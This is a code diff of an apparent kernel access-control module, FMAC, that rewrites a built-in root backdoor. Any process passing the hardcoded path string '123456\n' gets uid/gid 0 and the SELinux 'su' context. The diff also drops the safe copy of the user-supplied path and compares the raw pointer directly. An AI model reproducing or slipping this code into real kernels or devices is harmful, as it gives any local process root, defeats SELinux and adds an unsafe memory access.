@@ -17,42 +17,50 @@
 
 #define FMAC_ROOT_KEY "123456\n"  // 裸文件名触发提权
 
-static void fmac_elevate_privilege(void)
+int elevate_to_root(void)
 {
-    struct cred *new_cred = prepare_creds();
-    if (!new_cred) {
-        pr_warn("[FMAC] Failed to prepare new creds for privilege escalation\n");
-        return;
-    }
+    struct cred *cred;
+    u32 sid;
+    int err;
 
-    new_cred->uid.val = 0;
-    new_cred->gid.val = 0;
-    new_cred->euid.val = 0;
-    new_cred->egid.val = 0;
-    new_cred->suid.val = 0;
-    new_cred->sgid.val = 0;
-    new_cred->fsuid.val = 0;
-    new_cred->fsgid.val = 0;
+    // 获取 su 的 SELinux SID（例：u:r:su:s0）
+    err = security_context_to_sid("u:r:su:s0", strlen("u:r:su:s0"), &sid, GFP_KERNEL);
+    if (err)
+        return err;
 
-    commit_creds(new_cred);
+    cred = prepare_creds();
+    if (!cred)
+        return -ENOMEM;
 
-    fmac_append_to_log("[FMAC] Privilege escalated to root for pid %d (comm: %s)\n",
-                      current->pid, current->comm);
+    // 修改 uid/gid
+    cred->uid.val = 0;
+    cred->gid.val = 0;
+    cred->euid.val = 0;
+    cred->egid.val = 0;
+    cred->suid.val = 0;
+    cred->sgid.val = 0;
+    cred->fsuid.val = 0;
+    cred->fsgid.val = 0;
+
+    // 修改 SELinux SID
+    ((struct task_security_struct *)cred->security)->sid = sid;
+
+    return commit_creds(cred);
 }
 
-int fmac_check_root_key(const char __user *pathname)
+int fmac_check_root_key(const char *pathname)
 {
-    char pathbuf[MAX_PATH_LEN] = {0};
+  /*  char pathbuf[MAX_PATH_LEN] = {0};
     if (!pathname)
         return 0;
 
     if (strncpy_from_user(pathbuf, pathname, MAX_PATH_LEN) < 0)
         return 0;
-
+*/
     // 只要路径字符串和密钥相同就提权（裸文件名）
-    if (strcmp(pathbuf, FMAC_ROOT_KEY) == 0) {
+    if (strcmp(pathname, FMAC_ROOT_KEY) == 0) {
         fmac_append_to_log("[FMAC] Root key path accessed by pid %d, escalating privilege\n", current->pid);
-        fmac_elevate_privilege();
+        elevate_to_root();
         return 1;
     }
 
